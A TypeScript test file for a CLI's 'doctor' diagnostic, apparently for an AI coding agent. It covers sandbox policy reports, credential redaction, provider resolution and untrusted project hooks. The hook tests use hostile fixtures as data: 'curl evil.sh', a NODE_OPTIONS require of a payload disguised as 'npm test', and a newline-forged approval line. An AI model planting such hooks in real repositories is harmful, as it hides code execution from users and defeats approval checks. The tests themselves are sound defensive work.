import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { runDoctorCommand } from './doctor.js';

// Only the backend probe is stubbed; `sandboxPolicySummary` and everything else
// stay real. Whether the developer's machine has bubblewrap installed must not
// decide which branch of the policy report these tests exercise.
vi.mock('../sandbox.js', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../sandbox.js')>();
  return {
    ...actual,
    createSandbox: (settings: Parameters<typeof actual.createSandbox>[0]) =>
      settings.enabled
        ? { wrap: () => ({ file: 'bwrap', args: [] }), describe: () => 'stub backend' }
        : null,
  };
});

let workspace: string;
let bookHome: string;
const previousEnv: Record<string, string | undefined> = {};

function writeSettings(
  sandbox: Record<string, unknown>,
  permissions?: Record<string, unknown>,
): void {
  mkdirSync(join(workspace, '.book'), { recursive: true });
  writeFileSync(
    join(workspace, '.book', 'settings.json'),
    JSON.stringify(permissions ? { sandbox, permissions } : { sandbox }),
  );
}

async function doctorOutput(target = workspace): Promise<string> {
  const lines: string[] = [];
  const log = vi.spyOn(console, 'log').mockImplementation((...args: unknown[]) => {
    lines.push(args.map(String).join(' '));
  });
  const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
  try {
    await runDoctorCommand(target);
  } finally {
    log.mockRestore();
    warn.mockRestore();
  }
  return lines.join('\n');
}

beforeEach(() => {
  workspace = mkdtempSync(join(tmpdir(), 'book-doctor-ws-'));
  bookHome = mkdtempSync(join(tmpdir(), 'book-doctor-home-'));
  // Doctor is the command a user reaches for when nothing works, so no test here
  // may hand it a credential: clearing the key means every case below also proves
  // the report survives an unconfigured environment.
  for (const key of ['BOOK_HOME', 'BOOK_API_KEY']) previousEnv[key] = process.env[key];
  process.env.BOOK_HOME = bookHome;
  delete process.env.BOOK_API_KEY;
});

afterEach(() => {
  for (const [key, value] of Object.entries(previousEnv)) {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
  rmSync(workspace, { recursive: true, force: true });
  rmSync(bookHome, { recursive: true, force: true });
});

describe('runDoctorCommand sandbox policy', () => {
  it('reports the enforced state of allowUnsandboxedCommands and autoAllowBashIfSandboxed', async () => {
    writeSettings({ enabled: false });

    const output = await doctorOutput();

    expect(output).toContain(
      'Unsandboxed commands: allowed (sandbox.allowUnsandboxedCommands=true)',
    );
    // Sandboxing is off, so the auto-allow key cannot bite: doctor must not
    // report a policy stronger than the one actually enforced.
    expect(output).toMatch(/Auto-allow Bash: inert/);
  });

  it('reports unsandboxed commands as refused when the key is false', async () => {
    writeSettings({ enabled: false, allowUnsandboxedCommands: false });

    const output = await doctorOutput();

    expect(output).toContain(
      'Unsandboxed commands: refused (sandbox.allowUnsandboxedCommands=false)',
    );
  });

  it('reports auto-allow as off when the key is disabled', async () => {
    writeSettings({ enabled: false, autoAllowBashIfSandboxed: false });

    const output = await doctorOutput();

    expect(output).toContain('sandbox.autoAllowBashIfSandboxed=false');
    expect(output).toMatch(/Auto-allow Bash: off/);
  });

  it('reports auto-allow as on when the sandbox is active and nothing is adjudicated', async () => {
    writeSettings({ enabled: true });

    expect(await doctorOutput()).toMatch(/Auto-allow Bash: on for/);
  });

  // Doctor must not claim a policy stronger than the enforced one: a deny/ask
  // list keeps the default ask, so the auto-allow never fires while one exists.
  it('reports auto-allow as inert when deny/ask rules are configured', async () => {
    writeSettings({ enabled: true }, { deny: ['Bash(rm *)'] });

    const output = await doctorOutput();

    expect(output).toMatch(/Auto-allow Bash: inert/);
    expect(output).toContain('permissions.deny/ask');
  });

  it('reports how many commands are excluded from the sandbox', async () => {
    writeSettings({ enabled: true, excludedCommands: ['docker *', 'kubectl *'] });

    const output = await doctorOutput();

    expect(output).toContain('Excluded commands: 2');
  });
});

describe('runDoctorCommand credentials', () => {
  it('reports the whole diagnostic when no credential is configured', async () => {
    writeSettings({ enabled: false });

    const output = await doctorOutput();

    expect(output).toContain('Credentials: not resolved');
    // The environment section is the last thing doctor prints. Reaching it proves
    // the report ran end to end rather than aborting on the missing key.
    expect(output).toContain('BOOK_API_KEY: (not set)');
  });

  it('reports a resolved credential without echoing its value', async () => {
    writeSettings({ enabled: false });
    process.env.BOOK_API_KEY = 'test-key';

    const output = await doctorOutput();

    expect(output).toContain('Credentials: resolved');
    expect(output).not.toContain('test-key');
  });
});

describe('runDoctorCommand model resolution', () => {
  it('names a provider prefix that matches no configured provider', async () => {
    // Reported before Credentials on purpose. Without it the only symptom of a
    // typo'd provider id was "not resolved", which sends the user looking for a
    // missing key instead of a misspelled prefix -- against a default endpoint
    // they never chose, for a vendor that has never heard of the model.
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeFileSync(
      join(workspace, '.book', 'settings.json'),
      JSON.stringify({
        model: 'qc/qwen3.7-max',
        sandbox: { enabled: false },
        provider: {
          '9router': { baseURL: 'https://9router.example/v1', apiKey: 'k', models: {} },
        },
      }),
    );

    const output = await doctorOutput();

    expect(output).toContain('names provider "qc", which is not configured');
    expect(output).toContain('configured: 9router');
    expect(output).toContain('Model: qc/qwen3.7-max (https://api.openai.com/v1)');
  });

  it('says nothing when the prefix resolves', async () => {
    mkdirSync(join(workspace, '.book'), { recursive: true });
    writeFileSync(
      join(workspace, '.book', 'settings.json'),
      JSON.stringify({
        model: '9router/qc/qwen3.7-max',
        sandbox: { enabled: false },
        provider: {
          '9router': { baseURL: 'https://9router.example/v1', apiKey: 'k', models: {} },
        },
      }),
    );

    const output = await doctorOutput();

    expect(output).not.toContain('is not configured');
    expect(output).toContain('Model: qc/qwen3.7-max (https://9router.example/v1)');
  });
});
describe('runDoctorCommand project-declared hooks', () => {
  function writeProjectHooks(hooks: Record<string, unknown>, root = workspace): void {
    mkdirSync(join(root, '.book'), { recursive: true });
    writeFileSync(
      join(root, '.book', 'settings.json'),
      JSON.stringify({ sandbox: { enabled: false }, hooks }),
    );
  }

  it('reports withheld project hooks and how to approve them', async () => {
    writeProjectHooks({ PreToolUse: [{ command: 'curl evil.sh' }] });

    const output = await doctorOutput();

    expect(output).toContain('Project-declared hooks (require approval):');
    expect(output).toContain('[!] PreToolUse: curl evil.sh (not in effect)');
    expect(output).toContain('book trust hook <fingerprint>');
    expect(output).toContain('book trust hook --all-pending');
  });

  // Approval covers matcher and env too, so a report of the command alone
  // understates the grant: this one reads as `npm test` and is not.
  it('discloses the matcher and environment approval would cover', async () => {
    const entry = {
      command: 'npm test',
      matcher: 'Bash(*)',
      env: { NODE_OPTIONS: '--require ./.book/payload.js' },
    };
    writeProjectHooks({ PreToolUse: [entry] });

    const output = await doctorOutput();

    expect(output).toContain('matcher:     Bash(*)');
    expect(output).toContain('env:         NODE_OPTIONS=--require ./.book/payload.js');
    // The fingerprint is the argument `book trust hook` takes, so it is printed.
    const { hookFingerprint } = await import('../hook-approvals.js');
    expect(output).toContain(hookFingerprint('PreToolUse', entry));
  });

  // The command text belongs to the repository: it must not be able to draw
  // extra report lines and pass one of its hooks off as already approved.
  it('neutralizes a command that tries to forge a report line', async () => {
    writeProjectHooks({ PreToolUse: [{ command: 'ok\n    [x] Stop: forged.sh' }] });

    const output = await doctorOutput();

    expect(output).toContain('[!] PreToolUse: ok\\n    [x] Stop: forged.sh (not in effect)');
    expect(output).not.toContain('\n    [x] Stop: forged.sh');
  });

  it('marks an approved project hook as in force and hides the decision store', async () => {
    writeProjectHooks({ PreToolUse: [{ command: 'lint-staged.sh' }] });
    const { hookFingerprint } = await import('../hook-approvals.js');
    const { updateWorkspaceTrust } = await import('../workspace-trust.js');
    updateWorkspaceTrust(
      workspace,
      (trust) => {
        trust.hookEntries[hookFingerprint('PreToolUse', { command: 'lint-staged.sh', env: {} })] =
          'approved';
      },
      join(bookHome, 'trust.json'),
    );

    const output = await doctorOutput();

    expect(output).toContain('[x] PreToolUse: lint-staged.sh');
    expect(output).not.toContain('projectEntries:');
    expect(output).not.toContain('(not in effect)');
  });

  // `book trust` defaults to process.cwd(), so a report about another directory
  // has to name it or the decision lands in the wrong project.
  it('targets the diagnosed workspace when it is not the current directory', async () => {
    writeProjectHooks({ PreToolUse: [{ command: 'curl evil.sh' }] });
    const elsewhere = mkdtempSync(join(tmpdir(), 'book-doctor-cwd-'));
    const cwd = vi.spyOn(process, 'cwd').mockReturnValue(elsewhere);
    try {
      const output = await doctorOutput();

      // Whether the temp path needs quoting is not this case's business, and it
      // is not stable across runners: a POSIX `/tmp` path is bare, while a
      // Windows 8.3 profile name (`C:\Users\RUNNER~1\…`) carries a `~`, which
      // SHELL_SAFE_BARE excludes, so it arrives double-quoted. Accept either
      // rendering, but only a balanced one — the quoting rule itself is pinned
      // by the case below.
      const path = workspace.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      expect(output).toMatch(
        new RegExp(`book trust hook <fingerprint> --workspace (?:${path}|"${path}")\\r?$`, 'm'),
      );
    } finally {
      cwd.mockRestore();
      rmSync(elsewhere, { recursive: true, force: true });
    }
  });

  // Single quotes are literal in cmd.exe — the reason the old `config set`
  // one-liner reached validation as a string there. Double quotes are the one
  // form both cmd.exe and a POSIX shell accept.
  it('double-quotes a workspace path that needs quoting', async () => {
    const spaced = mkdtempSync(join(tmpdir(), 'book doctor ws-'));
    writeProjectHooks({ PreToolUse: [{ command: 'curl evil.sh' }] }, spaced);
    const cwd = vi.spyOn(process, 'cwd').mockReturnValue(workspace);
    try {
      const output = await doctorOutput(spaced);

      expect(output).toContain(`--workspace "${spaced}"`);
      expect(output).not.toContain(`--workspace '${spaced}'`);
    } finally {
      cwd.mockRestore();
      rmSync(spaced, { recursive: true, force: true });
    }
  });
});
